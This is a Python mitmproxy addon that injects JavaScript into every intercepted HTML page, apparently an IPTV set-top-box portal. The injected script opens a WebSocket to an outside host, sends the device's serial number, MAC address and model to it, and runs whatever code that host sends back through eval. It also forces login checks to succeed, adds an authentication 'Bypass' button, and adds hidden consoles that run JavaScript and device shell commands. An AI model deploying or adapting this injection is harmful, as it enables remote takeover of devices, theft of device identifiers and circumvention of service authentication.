import logging
import re
from mitmproxy import http

log = logging.getLogger("inject")

# configuration
WS_HOST = "192.168.50.1"
WS_PORT = 8765
WS_URL = f"ws://{WS_HOST}:{WS_PORT}/"

# only inject into responses matching this regex (adjust to your portal)
INJECT_HOST_RE = re.compile(r".*", re.IGNORECASE)

# the client script injected before </body>
CLIENT_JS = r"""
(function(){
  "use strict";

  var CFG = {
    WS_URL: "%(ws_url)s",
    KILL_PROVIDER_WS: true,
    ENABLE_MY_WS: true,
    NEW_APPS: true,
    SKIP_AUTH: true,
    SHOW_PANELS: true,
    PANEL_WIDTH: 1280,
    PANEL_HEIGHT: 720,
    RECONNECT_MS: 3000,
    WATCHDOG_MS: 3000
  };
  window.MY_WS_CFG = CFG;

  var RS = {
    ws:null, connected:false, connecting:false, retry:0,
    watchdog:null, url:CFG.WS_URL, reconnectTimer:null,
    connect:function(force){
      var s=this;
      if(!CFG.ENABLE_MY_WS) return;
      if(force){ s.retry=0; }
      if(s.ws && (s.ws.readyState===0||s.ws.readyState===1)) return;
      if(s.connecting) return;
      s.connecting=true;
      var w;
      try{ w=new WebSocket(s.url); }catch(e){ s.connecting=false; return s.scheduleRetry(); }
      s.ws=w;
      w.onopen=function(){
        s.connecting=false; s.connected=true; s.retry=0;
        s.hello(); s.startWatchdog();
      };
      w.onmessage=function(ev){
        var m; try{ m=JSON.parse(ev.data); }catch(e){ return; }
        if(m.type==="ping"){ s.send({type:"pong"}); return; }
        if(m.type!=="eval") return;
        var code = m.code||"";
        var r;
        try{
          r=(0,eval)(code);
        }catch(e){
          s.send({type:"error",error:String(e)});
          return;
        }
        try{
          if(r && typeof r.then==="function"){
            r.then(function(v){ s.send({type:"result",value:String(v)}); },
                   function(e){ s.send({type:"error",error:String(e)}); });
            return;
          }
          s.send({type:"result",value:String(r)});
        }catch(e){ s.send({type:"error",error:String(e)}); }
      };
      w.onclose=function(){
        s.connected=false; s.connecting=false; s.stopWatchdog(); s.ws=null;
        s.scheduleRetry();
      };
      w.onerror=function(){};
    },
    hello:function(){
      this.send({type:"hello",
        ua:navigator.userAgent,
        model:(window.viewModel&&viewModel.stb&&viewModel.stb.Model)||"?",
        serial:(window.viewModel&&viewModel.stb&&viewModel.stb.SerialNumber)||"?",
        mac:(window.viewModel&&viewModel.stb&&viewModel.stb.MACAddress)||"?",
        state:(window.viewModel&&viewModel.middleware&&viewModel.middleware.state)||"?"});
    },
    scheduleRetry:function(){
      var s=this;
      if(!CFG.ENABLE_MY_WS) return;
      if(s.reconnectTimer) return;
      s.reconnectTimer=setTimeout(function(){
        s.reconnectTimer=null;
        s.connect(true);
      }, CFG.RECONNECT_MS);
    },
    send:function(o){ if(this.ws && this.ws.readyState===1){ try{ this.ws.send(JSON.stringify(o)); }catch(e){} } },
    startWatchdog:function(){
      var s=this;
      s.stopWatchdog();
      s.watchdog=setInterval(function(){
        if(!s.ws) return;
        if(s.ws.readyState===2 || s.ws.readyState===3){
          s.stopWatchdog();
          if(s.ws.readyState===2){ try{ s.ws.close(); }catch(e){} }
          s.ws=null; s.connected=false; s.connecting=false;
          s.scheduleRetry();
        }
      }, CFG.WATCHDOG_MS);
    },
    stopWatchdog:function(){ if(this.watchdog){ clearInterval(this.watchdog); this.watchdog=null; } },
    disconnect:function(){ CFG.ENABLE_MY_WS=false; this.stopWatchdog(); if(this.ws){ try{this.ws.close();}catch(e){} } this.ws=null; this.connected=false; }
  };
  window.MyWS = RS;
  RS.connect();

  setInterval(function(){
    if(!CFG.ENABLE_MY_WS) return;
    if(!RS.connected && !RS.connecting && (!RS.ws || RS.ws.readyState>1)){
      RS.connect(true);
    }
  }, CFG.RECONNECT_MS);

  function skipAuth(){
    if(!CFG.SKIP_AUTH) return;
    try{
      if(!window.viewModel) return;
      var u=viewModel.user;
      u.data = u.data || {};
      u.client_id = u.client_id || 999999;
      u.name = u.name || "Lab";
      u.city_id = u.city_id || 1;
      u.data.tv_status = 1;
      u.data.app_run = "dashboard_new";
      u.data.system = u.data.system || {program_recall:{}};
      u.data.components_block = u.data.components_block || [[]];
      u.data.age_limit = u.data.age_limit || null;
      u.data.t_kl = u.data.t_kl || 0;
      u.data.current_channel_list_state = u.data.current_channel_list_state || 1;
    }catch(e){}
    try{ viewModel.middleware.changeState("dashboard_new", true); }catch(e){}
    try{
      if(window.saveUserData){
        saveUserData({
          result:true, client_id:999999, name:"Lab", city:1, tv_status:1, user_id:999999,
          system:{program_recall:{}}, components_block:[[]], app_run:"dashboard_new",
          age_limit:null, t_kl:0, volume:30, mediaplayer_history:"",
          current_channel_id:null, current_channel_list_state:1
        }).then(function(){ try{ viewModel.auth.initData(); }catch(e){} },
                function(){});
      }
    }catch(e){}
  }
  window.skipAuth=skipAuth;

  function getAuthMap(){
    var list = [];
    if(document.getElementById("login_input"))    list.push("login_input");
    if(document.getElementById("pass_input"))     list.push("pass_input");
    if(document.getElementById("auth_skip"))      list.push("auth_skip");
    if(document.getElementById("auth_login_btn")) list.push("auth_login_btn");
    return list;
  }

  function getInputField(){
    var A = window.viewModel && window.viewModel.auth;
    if(!A) return null;
    if(A.position === 0) return A.loginElem;
    if(A.position === 1) return A.passElem;
    return null;
  }

  function setActiveLayer(){
    var A = window.viewModel && window.viewModel.auth;
    if(!A) return;
    var ids = getAuthMap();
    var id = ids[A.position];
    var n = document.querySelectorAll("#auth_menu li.active_layer");
    for(var i=0;i<n.length;i++) n[i].classList.remove("active_layer");
    if(id){
      var el = document.getElementById(id);
      if(el){
        var li = el.closest ? el.closest("li") : el.parentElement;
        if(li) li.className = "active_layer";
      }
    }
  }

  function initFieldText(){
    var A = window.viewModel && window.viewModel.auth;
    if(!A) return;
    if(A.position === 0) A.text = A.loginElem.innerHTML;
    else if(A.position === 1) A.text = A.passElem.innerHTML;
    else A.text = "";
  }

  function patchAuthNav(){
    var A = window.viewModel && window.viewModel.auth;
    if(!A) return;

    A.moveToItem = function(d){
      var ids = getAuthMap();
      var max = ids.length - 1;
      if(max < 0) return;
      var t = this.position + d;
      if(t < 0) t = 0;
      if(t > max) t = max;
      if(t === this.position) return;
      this.noActiveItem();
      this.position = t;
      initFieldText();
      this.activeItem();
    };

    A.activeItem = function(){ setActiveLayer(); };

    A.noActiveItem = function(){
      var n = document.querySelectorAll("#auth_menu li.active_layer");
      for(var i=0;i<n.length;i++) n[i].classList.remove("active_layer");
    };

    A.ok = function(){
      var ids = getAuthMap();
      var id = ids[this.position];
      if(id === "auth_skip"){ skipAuth(); return; }
      if(id === "auth_login_btn"){ this.callback(); return; }
      this.moveToItem(1);
    };

    A.type_number = function(n){
      var f = getInputField();
      if(!f) return;
      if(this.text.length >= 10) return;
      this.text += n.toString();
      f.innerHTML = this.text;
      var ph = f.parentElement.querySelector(".placeholder");
      if(ph) ph.style.display = "none";
    };

    A.backspace = function(){
      var f = getInputField();
      if(!f) return;
      this.text = this.text.slice(0, -1);
      f.innerHTML = this.text;
      if(this.text.length === 0){
        var ph = f.parentElement.querySelector(".placeholder");
        if(ph) ph.style.display = "inline-block";
      }
    };

    A.key = function(k){
      if(k === 115 || k === 113){ skipAuth(); return; }
      if(k === 114){ this.backspace(); return; }
      if(k >= 48 && k <= 57){ this.type_number(k - 48); return; }
      switch(k){
        case 13: this.ok(); return;
        case 37: this.backspace(); return;
        case 40: this.moveToItem(1); return;
        case 38: this.moveToItem(-1); return;
      }
    };
    A.__patched = true;
  }

  function insertSkip(){
    if(!CFG.SKIP_AUTH) return false;
    var existing = document.getElementById("auth_skip");
    if(existing){
      if(!(window.viewModel && viewModel.auth && viewModel.auth.__patched)) patchAuthNav();
      return true;
    }
    var ul = document.getElementById("auth_menu");
    if(!ul) return false;
    var lis = ul.getElementsByTagName("li");
    var lb = null;
    for(var i=0;i<lis.length;i++){
      if(lis[i].querySelector(".btn_login")){ lb = lis[i]; break; }
    }
    if(!lb) return false;
    if(!lb.id) lb.id = "auth_login_btn";
    var sl = document.createElement("li");
    sl.innerHTML = '<div class="title text-lg">Bypass</div>' +
      '<div id="auth_skip" class="btn_login font-extrabold text-lg" ' +
      'style="background:#00ffce;color:#000a30">\u041f\u0440\u043e\u043f\u0443\u0441\u0442\u0438\u0442\u044c \u0432\u0445\u043e\u0434</div>';
    lb.parentNode.insertBefore(sl, lb);
    document.getElementById("auth_skip").onclick = skipAuth;

    try{
      if(window.viewModel && viewModel.auth){
        viewModel.auth.position = 0;
        viewModel.auth.text = "";
        viewModel.auth.noActiveItem();
        viewModel.auth.activeItem();
      }
    }catch(e){}

    patchAuthNav();
    return true;
  }

  setInterval(function(){
    if(!CFG.SKIP_AUTH) return;
    var ad = document.getElementById("auth_div");
    if(ad && ad.style.display !== "none"){ insertSkip(); }
  }, 500);

  function mkPanel(id, title, body){
    var d = document.getElementById(id);
    if(d) return d;
    d = document.createElement("div");
    d.id = id;
    d.style.cssText = "position:fixed;top:0;left:0;width:" + CFG.PANEL_WIDTH + "px;height:" + CFG.PANEL_HEIGHT + "px;" +
      "background:#000a30;color:#e6f1ff;z-index:99999;display:none;flex-direction:column;" +
      "font:16px/1.4 'Segoe UI',Roboto,Arial,sans-serif;box-sizing:border-box";
    d.innerHTML =
      '<div style="height:64px;min-height:64px;display:flex;align-items:center;' +
        'padding:0 24px;background:linear-gradient(90deg,#002078,#005cff);' +
        'border-bottom:2px solid #00ffce">' +
        '<div style="width:36px;height:36px;border-radius:8px;background:#00ffce;' +
          'color:#000a30;display:flex;align-items:center;justify-content:center;' +
          'font-weight:800;margin-right:14px">' + title.charAt(0) + '</div>' +
        '<div style="font-size:20px;font-weight:700;flex:1">' + title + '</div>' +
        '<div id="' + id + '_close" style="cursor:pointer;padding:8px 16px;' +
          'background:#ff3860;color:#fff;border-radius:6px;font-weight:700">\u2715 ESC</div>' +
      '</div>' +
      '<div id="' + id + '_body" style="flex:1;display:flex;flex-direction:column;overflow:hidden">' + body + '</div>';
    document.body.appendChild(d);
    document.getElementById(id + "_close").onclick = function(){
      viewModel.middleware.changeState("dashboard_new");
    };
    return d;
  }

  function ensurePanels(){
    if(!CFG.SHOW_PANELS) return;
    if(!document.getElementById("ws_app_div")){
      mkPanel("ws_app_div", "WS",
        '<div id="ws_app_body" style="padding:20px 24px;overflow:auto;flex:1">' +
          '<div style="display:grid;grid-template-columns:repeat(2,1fr);gap:12px;margin-bottom:16px">' +
            '<div style="background:#001030;padding:12px;border-radius:8px;border:1px solid #005cff">' +
              '<div style="color:#6a9cff;font-size:12px">client_id</div>' +
              '<div id="ws_cid" style="font-weight:700;font-size:18px">-</div></div>' +
            '<div style="background:#001030;padding:12px;border-radius:8px;border:1px solid #005cff">' +
              '<div style="color:#6a9cff;font-size:12px">tv_status</div>' +
              '<div id="ws_tv" style="font-weight:700;font-size:18px">-</div></div>' +
            '<div style="background:#001030;padding:12px;border-radius:8px;border:1px solid #005cff">' +
              '<div style="color:#6a9cff;font-size:12px">MAC</div>' +
              '<div id="ws_mac" style="font-weight:700;font-size:14px;word-break:break-all">-</div></div>' +
            '<div style="background:#001030;padding:12px;border-radius:8px;border:1px solid #005cff">' +
              '<div style="color:#6a9cff;font-size:12px">Serial</div>' +
              '<div id="ws_ser" style="font-weight:700;font-size:14px;word-break:break-all">-</div></div>' +
          '</div>' +
          '<div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:12px">' +
            '<button data-cmd="gSTB.RDir(\'IPAddress\')" style="background:#005cff;color:#fff;border:none;padding:10px 16px;border-radius:6px;cursor:pointer;font-weight:600">IP</button>' +
            '<button data-cmd="gSTB.ListDir(\'/media/\')" style="background:#005cff;color:#fff;border:none;padding:10px 16px;border-radius:6px;cursor:pointer;font-weight:600">USB</button>' +
            '<button data-cmd="JSON.stringify(mb.get(\'net.interfaces\'))" style="background:#005cff;color:#fff;border:none;padding:10px 16px;border-radius:6px;cursor:pointer;font-weight:600">net</button>' +
            '<button data-cmd="JSON.stringify(viewModel.user.data)" style="background:#005cff;color:#fff;border:none;padding:10px 16px;border-radius:6px;cursor:pointer;font-weight:600">user</button>' +
            '<button data-cmd="MyWS.connected" style="background:#00ffce;color:#000a30;border:none;padding:10px 16px;border-radius:6px;cursor:pointer;font-weight:600">WS</button>' +
            '<button data-cmd="viewModel.stb.reboot()" style="background:#ff3860;color:#fff;border:none;padding:10px 16px;border-radius:6px;cursor:pointer;font-weight:600">REBOOT</button>' +
          '</div>' +
          '<textarea id="ws_code" placeholder="// JS code - Ctrl+Enter = Run" spellcheck="false" ' +
            'style="width:100%;height:220px;background:#000814;color:#00ffce;' +
            'border:1px solid #005cff;border-radius:8px;padding:12px;' +
            'font:14px/1.5 monospace;box-sizing:border-box;resize:none;outline:none"></textarea>' +
          '<div style="margin-top:10px;display:flex;gap:8px">' +
            '<button id="ws_run" style="background:#00ffce;color:#000a30;border:none;' +
              'padding:10px 24px;border-radius:6px;cursor:pointer;font-weight:700">Run</button>' +
          '</div>' +
          '<pre id="ws_out" style="margin-top:12px;background:#000814;color:#ff0;' +
            'border:1px solid #005cff;border-radius:8px;padding:12px;' +
            'white-space:pre-wrap;word-break:break-all;font:13px/1.5 monospace;' +
            'min-height:60px;max-height:200px;overflow:auto"></pre>' +
        '</div>');
      bindWs();
    }
    if(!document.getElementById("console_app_div")){
      mkPanel("console_app_div", "Console",
        '<div style="padding:8px 24px;background:#001030;color:#6a9cff;font-size:13px;' +
          'border-bottom:1px solid #005cff">' +
          '<b style="color:#00ffce">JS</b> - eval &nbsp;&middot;&nbsp; ' +
          '<b style="color:#ff0">$</b> - shell (ExecAction) &nbsp;&middot;&nbsp; ' +
          '<b>&uarr;&darr;</b> - history' +
        '</div>' +
        '<pre id="cn_out" style="flex:1;overflow:auto;margin:0;padding:16px 24px;' +
          'background:#000814;color:#00ffce;white-space:pre-wrap;word-break:break-all;' +
          'font:14px/1.5 monospace"></pre>' +
        '<div style="display:flex;align-items:center;padding:12px 24px;' +
          'background:#001030;border-top:2px solid #00ffce">' +
          '<span style="color:#00ffce;font-weight:700;margin-right:12px;font-family:monospace">&gt;</span>' +
          '<input id="cn_in" autocomplete="off" spellcheck="false" ' +
            'style="flex:1;background:transparent;color:#00ffce;border:none;' +
            'outline:none;font:14px monospace"/>' +
        '</div>');
      bindConsole();
    }
    if(!document.getElementById("browser_app_div")){
      mkPanel("browser_app_div", "Browser",
        '<div style="display:flex;align-items:center;gap:8px;padding:10px 16px;' +
          'background:#001030;border-bottom:1px solid #005cff">' +
          '<input id="br_url" value="http://example.com" spellcheck="false" ' +
            'style="flex:1;background:#000814;color:#00ffce;border:1px solid #005cff;' +
            'border-radius:6px;padding:8px 12px;font:14px monospace;outline:none"/>' +
          '<button id="br_go" style="background:#00ffce;color:#000a30;border:none;' +
            'padding:8px 20px;border-radius:6px;font-weight:700;cursor:pointer">Go</button>' +
          '<button id="br_back" style="background:#005cff;color:#fff;border:none;' +
            'padding:8px 14px;border-radius:6px;cursor:pointer">&larr;</button>' +
          '<button id="br_fwd" style="background:#005cff;color:#fff;border:none;' +
            'padding:8px 14px;border-radius:6px;cursor:pointer">&rarr;</button>' +
        '</div>' +
        '<iframe id="br_frame" src="about:blank" ' +
          'style="flex:1;border:none;background:#fff"></iframe>');
      bindBrowser();
    }
  }

  function bindWs(){
    var d = document.getElementById("ws_app_div");
    function run(){
      var o = document.getElementById("ws_out");
      try{ o.textContent = String((0,eval)(document.getElementById("ws_code").value)); }
      catch(e){ o.textContent = "ERR: " + e; }
    }
    document.getElementById("ws_run").onclick = run;
    document.getElementById("ws_code").addEventListener("keydown", function(e){
      if(e.keyCode === 13 && e.ctrlKey){ e.preventDefault(); run(); }
    });
    Array.prototype.forEach.call(d.querySelectorAll("[data-cmd]"), function(b){
      b.onclick = function(){
        var o = document.getElementById("ws_out");
        try{ o.textContent = String((0,eval)(b.getAttribute("data-cmd"))); }
        catch(e){ o.textContent = "ERR: " + e; }
      };
    });
  }

  function bindConsole(){
    var history = [];
    var hIdx = 0;
    var inp = document.getElementById("cn_in");
    var out = document.getElementById("cn_out");
    if(!out.textContent) out.textContent = "Console v1\nEnter - run \u00b7 \u2191\u2193 - history \u00b7 ESC - exit\n\n";
    function exec(cmd){
      history.push(cmd); hIdx = history.length;
      out.textContent += "> " + cmd + "\n";
      var sh = cmd.charAt(0) === "$";
      var code = sh ? cmd.slice(1) : cmd;
      try{
        var r;
        if(sh){ r = viewModel.stb.device.ExecAction(code); }
        else { r = (0,eval)(code); }
        if(r && typeof r.then === "function"){
          r.then(function(v){ out.textContent += String(v) + "\n"; out.scrollTop = out.scrollHeight; },
                 function(e){ out.textContent += "REJECT: " + e + "\n"; out.scrollTop = out.scrollHeight; });
        } else {
          out.textContent += (typeof r === "object" && r !== null ? JSON.stringify(r) : String(r)) + "\n";
        }
      }catch(e){ out.textContent += "ERR: " + e + "\n"; }
      out.scrollTop = out.scrollHeight;
    }
    inp.addEventListener("keydown", function(e){
      if(e.keyCode === 13){
        var c = inp.value; inp.value = "";
        if(c) exec(c);
      } else if(e.keyCode === 38 && history.length){
        hIdx = Math.max(0, hIdx - 1); inp.value = history[hIdx] || "";
      } else if(e.keyCode === 40 && history.length){
        hIdx = Math.min(history.length, hIdx + 1); inp.value = history[hIdx] || "";
      } else if(e.keyCode === 27){
        viewModel.middleware.changeState("dashboard_new");
      }
    });
    setTimeout(function(){ try{ inp.focus(); }catch(e){} }, 100);
  }

  function bindBrowser(){
    function go(){
      var u = document.getElementById("br_url").value.trim();
      if(!u) return;
      if(u.indexOf("://") < 0) u = "http://" + u;
      document.getElementById("br_frame").src = u;
    }
    document.getElementById("br_go").onclick = go;
    document.getElementById("br_url").addEventListener("keydown", function(e){
      if(e.keyCode === 13) go();
      if(e.keyCode === 27) viewModel.middleware.changeState("dashboard_new");
    });
    document.getElementById("br_back").onclick = function(){
      try{ document.getElementById("br_frame").contentWindow.history.back(); }catch(e){}
    };
    document.getElementById("br_fwd").onclick = function(){
      try{ document.getElementById("br_frame").contentWindow.history.forward(); }catch(e){}
    };
    setTimeout(function(){ try{ document.getElementById("br_url").focus(); }catch(e){} }, 100);
  }

  var WSAPP = {
    name:"ws_app", title:"WS", visibility:false,
    init:function(){
      if(!CFG.NEW_APPS) return;
      this.visibility = true;
      ensurePanels();
      var d = document.getElementById("ws_app_div");
      if(d) d.style.display = "flex";
      try{
        document.getElementById("ws_cid").textContent = viewModel.user.client_id || "-";
        document.getElementById("ws_mac").textContent = viewModel.stb.MACAddress || "-";
        document.getElementById("ws_ser").textContent = viewModel.stb.SerialNumber || "-";
        document.getElementById("ws_tv").textContent = (viewModel.user.data && viewModel.user.data.tv_status) || "-";
      }catch(e){}
    },
    deInit:function(){
      this.visibility = false;
      var d = document.getElementById("ws_app_div"); if(d) d.style.display = "none";
    },
    key:function(k){ if(k === 27 || k === 122) viewModel.middleware.changeState("dashboard_new"); }
  };

  var CONSOLE = {
    name:"console_app", title:"Console", visibility:false,
    init:function(){
      if(!CFG.NEW_APPS) return;
      this.visibility = true;
      ensurePanels();
      var d = document.getElementById("console_app_div");
      if(d) d.style.display = "flex";
      setTimeout(function(){ try{ document.getElementById("cn_in").focus(); }catch(e){} }, 100);
    },
    deInit:function(){
      this.visibility = false;
      var d = document.getElementById("console_app_div"); if(d) d.style.display = "none";
    },
    key:function(k){ if(k === 27 || k === 122) viewModel.middleware.changeState("dashboard_new"); }
  };

  var BROWSER = {
    name:"browser_app", title:"Browser", visibility:false,
    init:function(){
      if(!CFG.NEW_APPS) return;
      this.visibility = true;
      ensurePanels();
      var d = document.getElementById("browser_app_div");
      if(d) d.style.display = "flex";
      setTimeout(function(){ try{ document.getElementById("br_url").focus(); }catch(e){} }, 100);
    },
    deInit:function(){
      this.visibility = false;
      var d = document.getElementById("browser_app_div");
      if(d){ d.style.display = "none"; try{ document.getElementById("br_frame").src = "about:blank"; }catch(e){} }
    },
    key:function(k){ if(k === 27 || k === 122) viewModel.middleware.changeState("dashboard_new"); }
  };

  var HELP_TILES = [
    {id:"ws",      title:"WS",      icon:"W", state:"ws_app"},
    {id:"console", title:"Console", icon:"C", state:"console_app"},
    {id:"browser", title:"Browser", icon:"B", state:"browser_app"}
  ];

  function buildHelpUI(){
    if(!CFG.NEW_APPS) return;
    var help = document.getElementById("manual_new_div");
    if(!help) return;
    help.style.background = "#000a30";
    help.innerHTML =
      '<div style="width:' + CFG.PANEL_WIDTH + 'px;height:' + CFG.PANEL_HEIGHT + 'px;background:#000a30;color:#e6f1ff;' +
        'font:16px/1.4 "Segoe UI",Roboto,Arial,sans-serif;display:flex;flex-direction:column">' +
        '<div style="height:64px;display:flex;align-items:center;padding:0 40px;' +
          'background:linear-gradient(90deg,#002078,#005cff);border-bottom:2px solid #00ffce">' +
          '<div style="width:36px;height:36px;border-radius:8px;background:#00ffce;' +
            'color:#000a30;display:flex;align-items:center;justify-content:center;' +
            'font-weight:800;margin-right:14px">?</div>' +
          '<div style="font-size:20px;font-weight:700">Help</div>' +
        '</div>' +
        '<div id="help_apps_grid" style="flex:1;padding:60px 60px;' +
          'display:grid;grid-template-columns:repeat(3,1fr);gap:24px;align-content:start">' +
        '</div>' +
        '<div style="padding:20px 60px;color:#6a9cff;font-size:14px">' +
          'ESC - back &middot; Arrows - navigate &middot; Enter - open' +
        '</div>' +
      '</div>';

    var grid = document.getElementById("help_apps_grid");
    HELP_TILES.forEach(function(t){
      var card = document.createElement("div");
      card.className = "help_app_card";
      card.setAttribute("data-state", t.state);
      card.style.cssText = "background:#001030;border:2px solid #005cff;border-radius:12px;" +
        "padding:28px;cursor:pointer;display:flex;flex-direction:column;" +
        "align-items:center;justify-content:center;gap:16px;" +
        "transition:all .15s;user-select:none";
      card.innerHTML =
        '<div style="width:80px;height:80px;border-radius:16px;background:#005cff;' +
          'color:#00ffce;display:flex;align-items:center;justify-content:center;' +
          'font-size:36px;font-weight:800">' + t.icon + '</div>' +
        '<div style="font-size:22px;font-weight:700;color:#e6f1ff">' + t.title + '</div>';
      card.onclick = function(){ viewModel.middleware.changeState(t.state); };
      card.onmouseenter = function(){
        card.style.borderColor = "#00ffce";
        card.style.background = "#002078";
        card.style.transform = "translateY(-2px)";
      };
      card.onmouseleave = function(){
        card.style.borderColor = "#005cff";
        card.style.background = "#001030";
        card.style.transform = "none";
      };
      grid.appendChild(card);
    });

    bindHelpNav();
    highlightHelp(0);
  }

  var helpIdx = 0;
  function getHelpCards(){
    return document.querySelectorAll("#help_apps_grid .help_app_card");
  }
  function highlightHelp(i){
    var cards = getHelpCards();
    if(!cards.length) return;
    if(i < 0) i = 0;
    if(i >= cards.length) i = cards.length - 1;
    helpIdx = i;
    for(var k = 0; k < cards.length; k++){
      var c = cards[k];
      if(k === i){
        c.style.borderColor = "#00ffce";
        c.style.background = "#002078";
        c.style.transform = "translateY(-2px)";
      } else {
        c.style.borderColor = "#005cff";
        c.style.background = "#001030";
        c.style.transform = "none";
      }
    }
  }
  function activateHelp(){
    var cards = getHelpCards();
    if(!cards.length) return;
    var st = cards[helpIdx].getAttribute("data-state");
    if(st) viewModel.middleware.changeState(st);
  }
  function bindHelpNav(){
    if(bindHelpNav.__done) return;
    bindHelpNav.__done = true;
    window.__helpOpenApp = function(){
      if(!window.viewModel || !viewModel.middleware) return false;
      if(viewModel.middleware.state !== "manual_new") return false;
      activateHelp();
      return true;
    };
  }

  var helpKeyHooked = false;
  function patchManualNewKey(){
    var mn = window.viewModel && window.viewModel.manual_new;
    if(!mn) return;
    if(helpKeyHooked) return;
    helpKeyHooked = true;
    var orig = mn.key;
    mn.key = function(k){
      if(!document.getElementById("help_apps_grid")){
        return orig ? orig.apply(this, arguments) : undefined;
      }
      switch(k){
        case 37: highlightHelp(helpIdx - 1); return;
        case 39: highlightHelp(helpIdx + 1); return;
        case 38: highlightHelp(helpIdx - 3); return;
        case 40: highlightHelp(helpIdx + 3); return;
        case 13: activateHelp(); return;
        case 27:
          viewModel.middleware.changeState("dashboard_new");
          return;
        case 122:
          viewModel.middleware.changeState("dashboard_new");
          return;
      }
      if(orig) return orig.apply(this, arguments);
    };
  }

  function patchManualNewInit(){
    if(!CFG.NEW_APPS) return;
    var mn = window.viewModel && window.viewModel.manual_new;
    if(!mn || mn.__helpPatched) return;
    mn.__helpPatched = true;

    var oi = mn.init;
    mn.init = function(){
      if(oi) oi.apply(this, arguments);
      buildHelpUI();
      setTimeout(buildHelpUI, 100);
      setTimeout(buildHelpUI, 500);
      patchManualNewKey();
    };

    var od = mn.deInit;
    mn.deInit = function(){
      bindHelpNav.__done = false;
      if(od) od.apply(this, arguments);
    };
  }

  function openApp(name){
    if(!CFG.NEW_APPS) return;
    try{
      if(!window.viewModel || !viewModel.middleware) return;
      viewModel.middleware.changeState(name, true);
    }catch(e){}
  }

  document.addEventListener("keydown", function(e){
    if(!CFG.NEW_APPS) return;
    if(e.altKey && e.ctrlKey && (e.keyCode === 87 || e.keyCode === 75)){
      e.preventDefault();
      openApp(e.keyCode === 87 ? "ws_app" : "console_app");
      return;
    }
    if(e.altKey && e.ctrlKey && e.keyCode === 66){
      e.preventDefault();
      openApp("browser_app");
    }
  }, true);

  window.openWs = function(){ openApp("ws_app"); };
  window.openConsole = function(){ openApp("console_app"); };
  window.openBrowser = function(){ openApp("browser_app"); };
  window.reconnectWS = function(){ RS.connect(true); };
  window.myWsSet = function(k, v){ CFG[k] = v; if(k === "ENABLE_MY_WS"){ if(v) RS.connect(true); else RS.disconnect(); } };

  function ready(){
    return window.viewModel && window.viewModel.middleware &&
           window.mwComponentsList && window.viewModel.dashboard_new &&
           window.viewModel.auth && window.viewModel.user;
  }

  function patchAll(){
    if(CFG.NEW_APPS){
      window.mwComponentsList["ws_app"]      = "WS/app";
      window.mwComponentsList["console_app"] = "Console/app";
      window.mwComponentsList["browser_app"] = "Browser/app";
      window.viewModel.ws_app      = WSAPP;
      window.viewModel.console_app = CONSOLE;
      window.viewModel.browser_app = BROWSER;
      ensurePanels();
    }

    if(CFG.SKIP_AUTH){
      var ock = window.viewModel.user.check_login;
      window.viewModel.user.check_login = function(){
        return ock.apply(this, arguments).then(function(r){
          if(r && r.result === false) r.result = true;
          return r;
        });
      };

      var oai = window.viewModel.auth.init;
      window.viewModel.auth.init = function(){
        oai.apply(this, arguments);
        insertSkip();
      };

      var ad = document.getElementById("auth_div");
      if(ad && ad.style.display !== "none") insertSkip();
    }

    if(CFG.NEW_APPS) patchManualNewInit();

    if(RS.connected) RS.hello();
  }

  var t = setInterval(function(){
    if(ready()){ clearInterval(t); setTimeout(patchAll, 200); }
  }, 200);
})();
"""

# injection marker (to avoid double-injecting)
INJECT_MARKER = "window.MY_WS_CFG"


def _client_script() -> str:
    # build the script with the configured WS URL
    return "<script>\n" + (CLIENT_JS % {"ws_url": WS_URL}) + "\n</script>\n"


def _inject_into_html(html: str) -> str:
    if INJECT_MARKER in html:
        return html  # already injected
    script = _client_script()
    # prefer inserting before </body>
    idx = html.lower().rfind("</body>")
    if idx != -1:
        return html[:idx] + script + html[idx:]
    # fallback: append at the end
    return html + script


# mitmproxy addon
class Injector:
    def response(self, flow: http.HTTPFlow) -> None:
        if not INJECT_HOST_RE.match(flow.request.pretty_host):
            return
        ctype = flow.response.headers.get("content-type", "")
        if "text/html" not in ctype.lower():
            return
        try:
            body = flow.response.get_text(strict=False)
        except Exception:
            return
        if not body:
            return
        new_body = _inject_into_html(body)
        if new_body is body:
            return
        flow.response.set_text(new_body)
        log.info("injected into %s", flow.request.pretty_url)


addons = [Injector()]
